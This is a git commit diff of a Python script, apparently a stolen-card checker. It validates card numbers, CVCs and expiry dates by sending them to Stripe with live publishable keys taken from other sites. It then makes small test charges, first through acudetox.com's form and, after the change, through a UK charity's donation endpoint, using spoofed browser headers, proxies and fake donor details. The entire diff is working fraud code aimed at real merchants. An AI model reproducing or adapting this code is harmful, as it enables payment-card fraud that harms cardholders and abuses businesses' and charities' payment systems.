5b633dd03d2c0b77f952a4a22af08a587ee374fb
thura320 <124812125+thura320@users.noreply.github.com>
2024-11-29 15:38:24 +0800

    Update gateway.py

--- gateway.py
+++ gateway.py
@@ -24,77 +24,75 @@ def Tele(ccx):
         if "20" in yy:  # Mo3gza
             yy = yy.split("20")[1]
         time.sleep(random.randrange(2,7))
-        
-        
 
-        headers = {
-            "accept": "application/json",
-            "accept-language": "en-US,en;q=0.7",
-            "content-type": "application/x-www-form-urlencoded",
-            "origin": "https://js.stripe.com",
-            "priority": "u=1, i",
-            "referer": "https://js.stripe.com/",
-            "sec-ch-ua": '"Brave";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-platform": '"Windows"',
-            "sec-fetch-dest": "empty",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-site": "same-site",
-            "sec-gpc": "1",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-        }
-
-        # data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=284765b7-69d6-481a-b4ed-9dd3277fbb75cd92ed&muid=953d9401-858b-4c98-b71e-a0efb5e2872a7b3cd0&sid=eddcdf3a-d301-4680-b8f9-e7f47237ee0dc79fcc&pasted_fields=number&payment_user_agent=stripe.js%2F064d3d4e55%3B+stripe-js-v3%2F064d3d4e55%3B+card-element&referrer=https%3A%2F%2Fkimsharris.com&time_on_page=28864&key=pk_live_51KigSfCPln27C4EmfOhhQpM0Ypdgk6MOvvj1PxqmzFg9haWYVDAo4fmwnxAtjD5Uy5xbRnfhXdMEvG1KumQfSfOs00KflBHGPx'
-        data = f"type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fa3221739cb%3B+stripe-js-v3%2Fa3221739cb%3B+card-element&referrer=https%3A%2F%2Facudetox.com&time_on_page=152236&key=pk_live_51PBnlrDPaQVax0KGyylGg5ThnhCqO0aOnAK1cExuOeDMCKFioHc4mMIAfIveKrh9C9a7UAtqcLaSgAhCOqyoSnvJ00XGhwDN9W"
-        r1 = requests.post(
-            "https://api.stripe.com/v1/payment_methods",
-            headers=headers,
-            data=data,
-            proxies=genProxy(),
-        )
-
-        pm = r1.json()["id"]
-        
-
-        cookies = {
-            "__stripe_mid": "953d9401-858b-4c98-b71e-a0efb5e2872a7b3cd0",
-            "__stripe_sid": "eddcdf3a-d301-4680-b8f9-e7f47237ee0dc79fcc",
-        }
-
-        headers = {
-            "Accept": "*/*",
-            "Accept-Language": "en-US,en;q=0.7",
-            "Connection": "keep-alive",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            # 'Cookie': '__stripe_mid=953d9401-858b-4c98-b71e-a0efb5e2872a7b3cd0; __stripe_sid=eddcdf3a-d301-4680-b8f9-e7f47237ee0dc79fcc',
-            "Origin": "https://acudetox.com/",
-            "Referer": "https://acudetox.com/group-training/",
-            "Sec-Fetch-Dest": "empty",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Site": "same-origin",
-            "Sec-GPC": "1",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-            "X-Requested-With": "XMLHttpRequest",
-            "sec-ch-ua": '"Brave";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-platform": '"Windows"',
-        }
-
-        params = {
-            "t": "1731942669751",
-        }
-
-        data = f"data=__fluent_form_embded_post_id%3D1531%26_fluentform_5_fluentformnonce%3D556aec5d91%26_wp_http_referer%3D%252Fgroup-training%252F%26names%255Bfirst_name%255D%3Daung%26names%255Blast_name%255D%3Dzaw%26email%3Dzawaungkyaw21%2540gmail.com%26custom-payment-amount_2%3D1%26item-quantity%3D1%26input_radio%3Dno%26custom-payment-amount_3%3D0%26terms-n-condition%3Don%26payment_method%3Dstripe%26alt_s%3D%26jcvdim2373%3D76041%26__stripe_payment_method_id%3D{pm}&action=fluentform_submit&form_id=5"
-
-        r2 = requests.post(
-            "https://acudetox.com/wp-admin/admin-ajax.php",
-            params=params,
-            cookies=cookies,
-            headers=headers,
-            data=data,
-            proxies=genProxy(),
-        )
-        
+##REQ1 
+    	headers = {
+    			'authority': 'api.stripe.com',
+    			'accept': 'application/json',
+    			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+    			'cache-control': 'no-cache',
+    			'content-type': 'application/x-www-form-urlencoded',
+    			'origin': 'https://js.stripe.com',
+    			'pragma': 'no-cache',
+    			'referer': 'https://js.stripe.com/',
+    			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    			'sec-ch-ua-mobile': '?1',
+    			'sec-ch-ua-platform': '"Android"',
+    			'sec-fetch-dest': 'empty',
+    			'sec-fetch-mode': 'cors',
+    			'sec-fetch-site': 'same-site',
+    			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    	}
+    
+    	data = f'type=card&billing_details[name]=Tiana&billing_details[email]=roogerauft%40gmail.com&billing_details[address][line1]=1020+West+Blvd&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=897e2c48-e03a-4fa0-a086-40e2fa945a484bf8f1&muid=5a769ee3-f69d-47de-a978-042256575ba27873fd&sid=80859c18-39a4-4601-9571-ff97e8ace802b53011&payment_user_agent=stripe.js%2F4b35ef0d67%3B+stripe-js-v3%2F4b35ef0d67%3B+split-card-element&referrer=https%3A%2F%2Farf.org.uk&time_on_page=26340&key=pk_live_s68z8JPiZ1q027N9bSbyUjgn'
+    	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+    
+    	pm = r1.json()['id']
+    
+    ##REQ2
+    	cookies = {
+    			'__stripe_mid': '5a769ee3-f69d-47de-a978-042256575ba27873fd',
+    			'wssplashuid': 'f53b43db26495a6de52ce14b8715e0b34b594d20.1728057343.1',
+    			'__stripe_sid': '80859c18-39a4-4601-9571-ff97e8ace802b53011',
+    	}
+    
+    	headers = {
+    			'authority': 'arf.org.uk',
+    			'accept': '*/*',
+    			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+    			'cache-control': 'no-cache',
+    			'content-type': 'application/json',
+    			# 'cookie': '__stripe_mid=5a769ee3-f69d-47de-a978-042256575ba27873fd; wssplashuid=f53b43db26495a6de52ce14b8715e0b34b594d20.1728057343.1; __stripe_sid=80859c18-39a4-4601-9571-ff97e8ace802b53011',
+    			'origin': 'https://arf.org.uk',
+    			'pragma': 'no-cache',
+    			'referer': 'https://arf.org.uk/donate/?__im-sFzkJhJR=1208077302829261439',
+    			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    			'sec-ch-ua-mobile': '?1',
+    			'sec-ch-ua-platform': '"Android"',
+    			'sec-fetch-dest': 'empty',
+    			'sec-fetch-mode': 'cors',
+    			'sec-fetch-site': 'same-origin',
+    			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    	}
+    
+    	json_data = {
+    			'payment_method_id': ''+str(pm)+'',
+    			'email': 'roogerauft@gmail.com',
+    			'firstname': 'Tiana',
+    			'amount': '1.00',
+    			'project_key': 'Food Packs\n',
+    			'package_description': 'Food Packs\n - Select Type',
+    			'last4': '4129',
+    			'exp_month': 11,
+    			'exp_year': 2026,
+    			}
+    	
+    	r2 = requests.post(
+    			'https://arf.org.uk/crm/stripe_files/create_payment.php',
+    			cookies=cookies,
+    			headers=headers,
+    			json=json_data,
+    	)
         return (ccx, r2.json(),ip)
     except:
         return "error", "error",ip
